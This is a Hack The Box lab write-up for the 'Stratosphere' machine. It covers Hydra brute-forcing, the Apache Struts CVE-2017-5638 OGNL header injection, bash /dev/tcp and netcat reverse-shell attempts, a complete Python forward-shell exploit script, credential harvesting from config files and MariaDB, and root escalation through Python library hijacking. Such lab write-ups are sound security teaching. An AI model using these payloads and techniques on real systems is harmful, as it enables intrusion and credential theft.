@@ -1,0 +1,769 @@
+Stratosphere - HTB - Linux Medium.
+
+Port 22 open debian server
+HTTP open, fingerprint strings 404 error, no server header
+Bunch of fingerprint outputed since it can't be recognized by nmap.
+
+We now use burp prior to going to the website to see the first request we make.
+
+We go to the robots.txt
+http://10.10.10.64/robots.txt
+
+But instead are greeted with a 404 error code and we learn the server is running Apache Tomcat/8.5.14 (Debian)
+We now go to manager, common tomcat url
+10.10.10.64/manager
+
+AND we are imediately prompted for a username and paswword. We enter default creds but none work.
+
+Start gobuster.
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/stratosphere]
+└──╼ $gobuster dir -u http://10.10.10.64 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.log
+==================================================================================================================================
+
+We try it on port 8080 and discover tomcat is running on both ports so we ignore running the gobuster on that port as well.
+
+We will now use hydra to bruteforce.
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/stratosphere/hydra]
+└──╼ $hydra -L users.txt -P /opt/SecLists/Passwords/darkweb2017-top1000.txt -f 10.10.10.64 http-get /manager
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-05-20 15:30:11
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 2997 login tries (l:3/p:999), ~188 tries per task
+[DATA] attacking http-get://10.10.10.64:80/manager
+[80][http-get] host: 10.10.10.64   login: admin   password: abc123
+[STATUS] attack finished for 10.10.10.64 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+
+==================================================================================================================================
+
+However we immediately get a hit and we use the creds that were bruteforced but they do not work.
+
+The reason why this happens is because we get redirected each time, for example on burp using repeater if we go to "/manager"
+We immediately are given a 302 message redirecting us to "/manager/".
+
+Then after following the redirect to /manager/ emphasis on the "/" it immediately tells us the redirect location being /manager/html 
+response from the server we get a 302 meesage telling us to go to /manager/html
+Commands and Output:
+==================================================================================================================================
+REQUEST:
+GET /manager/ HTTP/1.1
+Host: 10.10.10.64
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+
+RESPONSE:
+HTTP/1.1 302 
+Location: /manager/html
+Content-Type: text/html
+Content-Length: 0
+Date: Thu, 20 May 2021 22:38:00 GMT
+Connection: close
+==================================================================================================================================
+
+"/manager/html" is the true http-get login page to perform the bruteforce. So we edit our hydra command
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/stratosphere/hydra]
+└──╼ $hydra -L users.txt -P /opt/SecLists/Passwords/darkweb2017-top1000.txt -f 10.10.10.64 http-get /manager/html
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 2997 login tries (l:3/p:999), ~188 tries per task
+[DATA] attacking http-get://10.10.10.64:80/manager/html
+
+..
+..
+..
+==================================================================================================================================
+
+We got to our gobuster findings and see "/Monitoring" as page that was found, we go to it and re redirected to:
+http://10.10.10.64/Monitoring/example/Welcome.action
+
+Upon going there we are immediately given a jsession cookie. Which is common with tomcat.
+
+We want to google for the .action java file and see what that is about.
+We find the following reply: "It's probably just a URL pattern for firing a Struts action. Most people stick with the .do convention,
+but you can make the actions fire on just about anything you want."
+
+STRUTS apparently has a lot of vulnerabilities especially in apache. big one was equifax. Which in this case exemplifies what the 
+webpages from the website are trying to convey with web credit card monitoring.
+
+We google identify struts running. Further looking we find a qualys post clearly showing how to identify such case.
+https://blog.qualys.com/product-tech/2017/03/14/apache-struts-cve-2017-5638-vulnerability-and-the-qualys-solution
+
+There aparently is somehting in a content type header with math. If the math is being processed then we can verify that it could
+have code execution. We will add the header that was provided by qualys to see if we can get execution
+
+Commands and Output:
+==================================================================================================================================
+Content-Type:%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Qualys-Struts',3195*5088)}.multipart/form-data
+==================================================================================================================================
+
+We use repeater as the following and wait for the response.
+Commands and Output:
+==================================================================================================================================
+GET /Monitoring/example/Register.action HTTP/1.1
+Host: 10.10.10.64
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Connection: close
+Cookie: JSESSIONID=EF86D70B804806EB7060F2CD82F2CB8A
+Content-Type:%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Qualys-Struts',3195*5088)}.multipart/form-data
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+
+
+RESPONSE:
+HTTP/1.1 200 
+X-Qualys-Struts: 16256160
+Content-Type: text/html;charset=UTF-8
+Content-Length: 6567
+Date: Thu, 20 May 2021 22:59:23 GMT
+Connection:
+
+..
+..
+..
+< SNIP >
+==================================================================================================================================
+
+We see that the server sends back a response with the header title we gave it as well as the math execution.
+We grab the CVE info which was "2017-5638" and search for an exploit. We eventually find a github page and clone it.
+
+https://github.com/mazen160/struts-pwn.git
+
+We run the tool and get some output
+Commands and Output:
+==================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/stratosphere/struts-pwn]
+└──╼ $python struts-pwn.py --url 'http://10.10.10.64/Monitoring/example/Register.action' -c 'id'
+
+[*] URL: http://10.10.10.64/Monitoring/example/Register.action
+[*] CMD: id
+[!] ChunkedEncodingError Error: Making another request to the url.
+Refer to: https://github.com/mazen160/struts-pwn/issues/8 for help.
+EXCEPTION::::--> ("Connection broken: InvalidChunkLength(got length b'', 0 bytes read)", InvalidChunkLength(got length b'', 0 bytes read))
+Note: Server Connection Closed Prematurely
+
+uid=115(tomcat8) gid=119(tomcat8) groups=119(tomcat8)
+
+[%] Done.
+==================================================================================================================================
+
+We now try and go for a reverse shell
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/stratosphere/struts-pwn]
+└──╼ $python struts-pwn.py --url 'http://10.10.10.64/Monitoring/example/Register.action' -c 'bash -c "bash -i >& /dev/tcp/10.10.14.18/9001 0>&1"'
+
+[*] URL: http://10.10.10.64/Monitoring/example/Register.action
+[*] CMD: bash -c "bash -i >& /dev/tcp/10.10.14.18/9001 0>&1"
+EXCEPTION::::--> HTTPConnectionPool(host='10.10.10.64', port=80): Read timed out. (read timeout=3)
+ERROR
+[%] Done.
+==================================================================================================================================
+
+However it keeps timing out. We try it once more on port 80
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/stratosphere/struts-pwn]
+└──╼ $python struts-pwn.py --url 'http://10.10.10.64/Monitoring/example/Register.action' -c 'bash -i >& /dev/tcp/10.10.14.18/80 0>&1'
+
+[*] URL: http://10.10.10.64/Monitoring/example/Register.action
+[*] CMD: bash -i >& /dev/tcp/10.10.14.18/80 0>&1
+EXCEPTION::::--> HTTPConnectionPool(host='10.10.10.64', port=80): Read timed out. (read timeout=3)
+ERROR
+[%] Done.
+==================================================================================================================================
+
+But we keep timing out, to test firewall rules we use wget and see if we can get header responses.
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/stratosphere/struts-pwn]
+└──╼ $python struts-pwn.py --url 'http://10.10.10.64/Monitoring/example/Register.action' -c 'wget http://10.10.14.18/'
+
+[*] URL: http://10.10.10.64/Monitoring/example/Register.action
+[*] CMD: wget http://10.10.14.18/
+EXCEPTION::::--> HTTPConnectionPool(host='10.10.10.64', port=80): Read timed out. (read timeout=3)
+ERROR
+[%] Done.
+==================================================================================================================================
+
+We still don't get anything. We verify that netcat is installed and try to get out via a udp shell since it looks like all tcp 
+connections are blocked.
+
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/stratosphere/struts-pwn]
+└──╼ $python struts-pwn.py --url 'http://10.10.10.64/Monitoring/example/Register.action' -c 'nc -u 10.10.14.18 53'
+
+[*] URL: http://10.10.10.64/Monitoring/example/Register.action
+[*] CMD: nc -u 10.10.14.18 53
+EXCEPTION::::--> HTTPConnectionPool(host='10.10.10.64', port=80): Read timed out. (read timeout=3)
+ERROR
+[%] Done.
+
+..
+..
+..
+
+┌─[✗]─[user@parrot-virtual]─[~/htb/stratosphere/struts-pwn]
+└──╼ $sudo nc -lnvup 53
+Ncat: Version 7.91 ( https://nmap.org/ncat )
+Ncat: Listening on :::53
+Ncat: Listening on 0.0.0.0:53
+==================================================================================================================================
+
+We still don't get a connect back. Firewall is not letting us out. Lastly we try to do an ipv6 connection hoping that is not 
+diabled as well.
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/stratosphere/struts-pwn]
+└──╼ $python struts-pwn.py --url 'http://10.10.10.64/Monitoring/example/Register.action' -c 'wget -6 http://[dead:beef:2::1010]'
+
+[*] URL: http://10.10.10.64/Monitoring/example/Register.action
+[*] CMD: wget -6 http://[dead:beef:2::1010]
+EXCEPTION::::--> HTTPConnectionPool(host='10.10.10.64', port=80): Read timed out. (read timeout=3)
+ERROR
+[%] Done.
+
+..
+..
+..
+
+┌─[✗]─[user@parrot-virtual]─[~/htb/stratosphere/struts-pwn]
+└──╼ $sudo nc -lnvp 80
+Ncat: Version 7.91 ( https://nmap.org/ncat )
+Ncat: Listening on :::80
+Ncat: Listening on 0.0.0.0:80
+
+==================================================================================================================================
+
+However we never get the connect back, fully letting us know that vector is blocked as well. So we can either coninue using the 
+struts python script to continue the recon of the box albeit with a slower interface or we can create an http forward shell, that
+will allow us to make multiple requests as if we were on a command line interface.
+
+To accomplish we write a script in python that will make the get requests to the server and then output results back to us.
+
+The following is the completed python code.
+Commands and Output:
+==================================================================================================================================
+#!/usr/bin/python3
+# -*- coding: utf-8 -*-
+
+import base64 
+import random
+import requests
+import threading
+import time
+
+class WebShell(object):
+
+    # Initialize CLass + SetUp Shell
+    def __init__(self, interval=1.3, proxies='http://127.0.0.1:8080'):
+        self.url = r"http://10.10.10.64/Monitoring/example/Register.action"
+        self.proxies = {'http': proxies}
+        session = random.randrange(10000, 99999)
+        print(f"[*] Session ID: {session}")
+        self.stdin = f'/dev/shm/input.{session}'
+        self.stdout = f'/dev/shm/output.{session}'
+        self.interval = interval
+
+        # Setup Shell
+        print("[*] Setting up fifo shell on target")
+        #MakeNamedPipes = f"mkfifo {self.stdin}; tail -f {self.stdin} | /bin/sh 2>&1 > {self.stdout}"
+        MakeNamedPipes = f"mkfifo {self.stdin}; tail -f {self.stdin} | /bin/sh  > {self.stdout} 2>&1"
+        self.RunRawCmd(MakeNamedPipes, timeout=0.1)
+
+        # Setup up read thread 
+        print("[*] Setting up read thread")
+        self.interval = interval
+        thread = threading.Thread(target=self.ReadThread, args=())
+        thread.daemon = True
+        thread.start()
+
+    # Read $session, output text to screen and wipe session
+    def ReadThread(self):
+        GetOutput = f"/bin/cat {self.stdout}"
+        while True:
+            result = self.RunRawCmd(GetOutput)
+            if result:
+                print(result)
+                ClearOutput = f'echo -n "" > {self.stdout}'
+                self.RunRawCmd(ClearOutput)
+            time.sleep(self.interval)
+
+    def RunRawCmd(self, cmd, timeout=50, proxy="http://127.0.0.1:8080"):
+
+        # Print(f"Going to run cmd: {cmd})
+        payload = "%{(#_='multipart/form-data')."     
+        payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."     
+        payload += "(#_memberAccess?"     
+        payload += "(#_memberAccess=#dm):"     
+        payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."     
+        payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."     
+        payload += "(#ognlUtil.getExcludedPackageNames().clear())."     
+        payload += "(#ognlUtil.getExcludedClasses().clear())."     
+        payload += "(#context.setMemberAccess(#dm))))."     
+        payload += "(#cmd='%s')." % cmd     
+        payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."     
+        payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."     
+        payload += "(#p=new java.lang.ProcessBuilder(#cmds))."     
+        payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."     
+        payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."     
+        payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."     
+        payload += "(#ros.flush())}"     
+
+
+        if proxy:
+            proxies = self.proxies
+        else:
+            proxies = {}
+
+
+        headers = {'User-Agent':'AssHAt', 'Content-Type': payload}
+        try:
+            r = requests.get(self.url, headers=headers, proxies=proxies, timeout=timeout)
+            return r.text
+        except:
+            pass
+
+    def WriteCmd(self, cmd):
+        b64cmd = base64.b64encode('{}\n'.format(cmd.rstrip()).encode('utf-8')).decode('utf-8')
+        stage_cmd = f'echo {b64cmd} | base64 -d > {self.stdin}'
+        self.RunRawCmd(stage_cmd)
+        time.sleep(self.interval * 1.1)
+
+    def UpgradeShell(self):
+        # Upgrade shell
+        UpgradeShell = """python3 -c 'import pty; pty.spawn("/bin/bash")'"""
+        self.WriteCmd(UpgradeShell)
+
+prompt = "$> "
+S = WebShell()
+while True:
+    cmd = input(prompt)
+    if cmd == "upgrade":
+        prompt = ""
+        S.UpgradeShell()
+    else:
+        S.WriteCmd(cmd)
+==================================================================================================================================
+
+We can now run it and get responses from the server.
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/stratosphere/http-forward-shell]
+└──╼ $python3 webshell.py 
+[*] Session ID: 75696
+[*] Setting up fifo shell on target
+[*] Setting up read thread
+$> ls
+conf
+db_connect
+lib
+logs
+policy
+webapps
+work
+
+$>
+==================================================================================================================================
+
+We can even upgrade our shell to simulate a real terminal with the following
+Commands and Output:
+==================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/stratosphere/http-forward-shell]
+└──╼ $python3 webshell.py 
+[*] Session ID: 88755
+[*] Setting up fifo shell on target
+[*] Setting up read thread
+$> upgrade
+tomcat8@stratosphere:~$ 
+pwd
+pwd
+/var/lib/tomcat8
+tomcat8@stratosphere:~$
+==================================================================================================================================
+
+We can now navigate web directories with more easy looking for ways to escalate through the box.
+
+Going into the conf directory and cat tomcat-user.xml
+Commands and Output:
+==================================================================================================================================
+tomcat8@stratosphere:~/conf$ 
+cat tomcat-users.xml
+cat tomcat-users.xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!--
+  Licensed to the Apache Software Foundation (ASF) under one or more
+  contributor license agreements.  See the NOTICE file distributed with
+  this work for additional information regarding copyright ownership.
+  The ASF licenses this file to You under the Apache License, Version 2.0
+  (the "License"); you may not use this file except in compliance with
+  the License.  You may obtain a copy of the License at
+
+      http://www.apache.org/licenses/LICENSE-2.0
+
+  Unless required by applicable law or agreed to in writing, software
+  distributed under the License is distributed on an "AS IS" BASIS,
+  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+  See the License for the specific language governing permissions and
+  limitations under the License.
+-->
+<tomcat-users xmlns="http://tomcat.apache.org/xml"
+              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
+              version="1.0">
+<!--
+  NOTE:  By default, no user is included in the "manager-gui" role required
+  to operate the "/manager/html" web application.  If you wish to use this app,
+  you must define such a user - the username and password are arbitrary. It is
+  strongly recommended that you do NOT use one of the users in the commented out
+  section below since they are intended for use with the examples web
+  application.
+-->
+<!--
+  NOTE:  The sample user and role entries below are intended for use with the
+  examples web application. They are wrapped in a comment and thus are ignored
+  when reading this file. If you wish to configure these users for use with the
+  examples web application, do not forget to remove the <!.. ..> that surrounds
+  them. You will also need to set the passwords to something appropriate.
+-->
+<!--
+  <role rolename="tomcat"/>
+  <role rolename="role1"/>
+  <user username="tomcat" password="<must-be-changed>" roles="tomcat"/>
+  <user username="both" password="<must-be-changed>" roles="tomcat,role1"/>
+  <user username="role1" password="<must-be-changed>" roles="role1"/>
+-->
+<user username="teampwner" password="cd@6sY{f^+kZV8J!+o*t|<fpNy]F_(Y$" roles="manager-gui,admin-gui" />
+</tomcat-users>
+==================================================================================================================================
+
+We find a username and password but those creds appear to be non-operational after trying them and using them to login to the
+tomcat server. 
+"teampwner" password="cd@6sY{f^+kZV8J!+o*t|<fpNy]F_(Y$"
+
+Maybe somekind of acl that only allows localhost to login.
+Our main task is to get to the database, based on the equifax hack they exfilled the database.
+
+
+Commands and Output:
+==================================================================================================================================
+tomcat8@stratosphere:~/conf$ 
+file *
+file *
+Catalina:             directory
+catalina.properties:  ASCII text
+context.xml:          XML 1.0 document, ASCII text
+jaspic-providers.xml: XML 1.0 document, ASCII text
+logging.properties:   ASCII text
+policy.d:             directory
+server.xml:           XML 1.0 document, ASCII text
+tomcat-users.xml:     XML 1.0 document, ASCII text
+web.xml:              XML 1.0 document, ASCII text
+
+..
+..
+..
+
+tomcat8@stratosphere:~$ 
+ls
+ls
+conf  db_connect  lib  logs  policy  webapps  work
+tomcat8@stratosphere:~$ 
+file *
+file *
+conf:       symbolic link to /etc/tomcat8
+db_connect: ASCII text
+lib:        directory
+logs:       symbolic link to ../../log/tomcat8
+policy:     directory
+webapps:    directory
+work:       symbolic link to ../../cache/tomcat8
+
+
+==================================================================================================================================
+
+We can cat db_connect and we get more creds
+Commands and Output:
+==================================================================================================================================
+tomcat8@stratosphere:~$ 
+cat db_connect
+cat db_connect
+[ssn]
+user=ssn_admin
+pass=AWs64@on*&
+
+[users]
+user=admin
+pass=admin
+==================================================================================================================================
+
+We can now try to use mysql with the creds, using ssn_admin we will attempt to login and query for info.
+Commands and Output:
+==================================================================================================================================
+tomcat8@stratosphere:~$ 
+mysql -h localhost -u ssn_admin -p
+mysql -h localhost -u ssn_admin -p
+Enter password: 
+AWs64@on*&
+
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 4
+Server version: 10.1.26-MariaDB-0+deb9u1 Debian 9.1
+
+Copyright (c) 2000, 2017, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MariaDB [(none)]>
+==================================================================================================================================
+
+We are now in the database, we query it for info but get nothing back
+Commands and Output:
+==================================================================================================================================
+MariaDB [(none)]> 
+show databases;
+show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| ssn                |
++--------------------+
+2 rows in set (0.00 sec)
+
+MariaDB [(none)]> 
+use ssn;
+use ssn;
+Database changed
+MariaDB [ssn]> 
+show tables;
+show tables;
+Empty set (0.00 sec)
+
+==================================================================================================================================
+
+So instead the other set of creds and use those to login and query the db.
+Commands and Output:
+==================================================================================================================================
+mysql -h localhost -u admin -p
+Enter password: 
+admin
+
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 5
+Server version: 10.1.26-MariaDB-0+deb9u1 Debian 9.1
+
+Copyright (c) 2000, 2017, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MariaDB [(none)]> 
+show databases;
+show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| users              |
++--------------------+
+2 rows in set (0.00 sec)
+
+MariaDB [(none)]> 
+use users;
+use users;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+MariaDB [users]> 
+show tables;
+show tables;
++-----------------+
+| Tables_in_users |
++-----------------+
+| accounts        |
++-----------------+
+1 row in set (0.00 sec)
+==================================================================================================================================
+
+We then finally select the accounts table and show the contents
+Commands and Output:
+==================================================================================================================================
+MariaDB [users]> 
+select * from accounts;
++------------------+---------------------------+----------+
+| fullName         | password                  | username |
++------------------+---------------------------+----------+
+| Richard F. Smith | 9tc*rhKuG5TyXvUJOrE^5CK7k | richard  |
++------------------+---------------------------+----------+
+1 row in set (0.00 sec)
+==================================================================================================================================
+
+We get the richard user and the password, we attempt to use these creds on the web server to login but no change. So instead we 
+remember there was an ssh service port open and we attempt to login with the creds.
+Commands and Output:
+==================================================================================================================================
+└──╼ $ssh richard@10.10.10.64
+The authenticity of host '10.10.10.64 (10.10.10.64)' can't be established.
+ECDSA key fingerprint is SHA256:tQZo8j1TeVASPxWyDgqJf8PaDZJV/+LeeBZnjueAW/E.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.10.64' (ECDSA) to the list of known hosts.
+richard@10.10.10.64's password: 
+Linux stratosphere 4.9.0-6-amd64 #1 SMP Debian 4.9.82-1+deb9u2 (2018-02-21) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Tue Feb 27 16:26:33 2018 from 10.10.14.2
+richard@stratosphere:~$
+==================================================================================================================================
+
+We are now in the box. First thing we notice is a file named test.py that is owned by root and the group owner being set to richard
+who has read and execute permissions but no write.
+Commands and Output:
+==================================================================================================================================
+richard@stratosphere:~$ ls -la
+total 40
+drwxr-x--- 5 richard richard 4096 Mar 19  2018 .
+drwxr-xr-x 4 root    root    4096 Sep 19  2017 ..
+lrwxrwxrwx 1 root    root       9 Feb 10  2018 .bash_history -> /dev/null
+-rw-r--r-- 1 richard richard  220 Sep 19  2017 .bash_logout
+-rw-r--r-- 1 richard richard 3526 Sep 19  2017 .bashrc
+drwxr-xr-x 3 richard richard 4096 Oct 18  2017 .cache
+drwxr-xr-x 3 richard richard 4096 Oct 18  2017 .config
+-rw-r--r-- 1 richard richard  675 Sep 19  2017 .profile
+drwxr-xr-x 2 richard richard 4096 Oct 18  2017 Desktop
+-rwxr-x--- 1 root    richard 1507 Mar 19  2018 test.py
+-r-------- 1 richard richard   33 Feb 27  2018 user.txt
+==================================================================================================================================
+
+The contents are the following
+Commands and Output:
+==================================================================================================================================
+richard@stratosphere:~$ cat test.py 
+#!/usr/bin/python3
+import hashlib
+
+
+def question():
+    q1 = input("Solve: 5af003e100c80923ec04d65933d382cb\n")
+    md5 = hashlib.md5()
+    md5.update(q1.encode())
+    if not md5.hexdigest() == "5af003e100c80923ec04d65933d382cb":
+        print("Sorry, that's not right")
+        return
+    print("You got it!")
+    q2 = input("Now what's this one? d24f6fb449855ff42344feff18ee2819033529ff\n")
+    sha1 = hashlib.sha1()
+    sha1.update(q2.encode())
+    if not sha1.hexdigest() == 'd24f6fb449855ff42344feff18ee2819033529ff':
+        print("Nope, that one didn't work...")
+        return
+    print("WOW, you're really good at this!")
+    q3 = input("How about this? 91ae5fc9ecbca9d346225063f23d2bd9\n")
+    md4 = hashlib.new('md4')
+    md4.update(q3.encode())
+    if not md4.hexdigest() == '91ae5fc9ecbca9d346225063f23d2bd9':
+        print("Yeah, I don't think that's right.")
+        return
+    print("OK, OK! I get it. You know how to crack hashes...")
+    q4 = input("Last one, I promise: 9efebee84ba0c5e030147cfd1660f5f2850883615d444ceecf50896aae083ead798d13584f52df0179df0200a3e1a122aa738beff263b49d2443738eba41c943\n")
+    blake = hashlib.new('BLAKE2b512')
+    blake.update(q4.encode())
+    if not blake.hexdigest() == '9efebee84ba0c5e030147cfd1660f5f2850883615d444ceecf50896aae083ead798d13584f52df0179df0200a3e1a122aa738beff263b49d2443738eba41c943':
+        print("You were so close! urg... sorry rules are rules.")
+        return
+
+    import os
+    os.system('/root/success.py')
+    return
+
+question()
+==================================================================================================================================
+
+The whole point of the script is to solve and find the plain text of each hash
+Commands and Output:
+==================================================================================================================================
+richard@stratosphere:~$ ./test.py 
+Solve: 5af003e100c80923ec04d65933d382cb
+alalsls
+Sorry, that's not right
+==================================================================================================================================
+
+This will take forever to crack, so we may need to find a way to break the python script itself.
+Python programs do not do setuid since python will strip that out. Test.py does not have execute permissions however we look at 
+sudo -l and we see that we can execute the python script as root.
+Commands and Output:
+==================================================================================================================================
+richard@stratosphere:~$ sudo -l
+Matching Defaults entries for richard on stratosphere:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User richard may run the following commands on stratosphere:
+    (ALL) NOPASSWD: /usr/bin/python* /home/richard/test.py
+
+..
+..
+..
+
+richard@stratosphere:~$ sudo python /home/richard/test.py 
+Solve: 5af003e100c80923ec04d65933d382cb
+shsnjsakn
+Sorry, that's not right
+==================================================================================================================================
+
+Richard may run the file as sudo, so we can try and take advantage of this and see if there are any holes in the script we can 
+exploit.
+
+Python is abit weird in that it loads libraries first from the current directory.
+Commands and Output:
+==================================================================================================================================
+richard@stratosphere:~$ python -c 'import sys; print(sys.path)'
+['', '/usr/lib/python35.zip', '/usr/lib/python3.5', '/usr/lib/python3.5/plat-x86_64-linux-gnu', '/usr/lib/python3.5/lib-dynload', '/usr/local/lib/python3.5/dist-packages', '/usr/lib/python3/dist-packages']
+==================================================================================================================================
+
+We can take advantage of the first import statement which is a reference to hashlib and basically write our ownhaslib that will
+give us a root shell.
+Commands and Output:
+==================================================================================================================================
+richard@stratosphere:~$ cat hashlib.py 
+import os
+
+os.system("/bin/bash
+
+..
+..
+..
+
+richard@stratosphere:~$ sudo python /home/richard/test.py 
+root@stratosphere:/home/richard# id
+uid=0(root) gid=0(root) groups=0(root)
+==================================================================================================================================
+
+So now when we import hashlib it will look for haslib on our current working directory. It will find bash and execute it.
+We are now root.
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
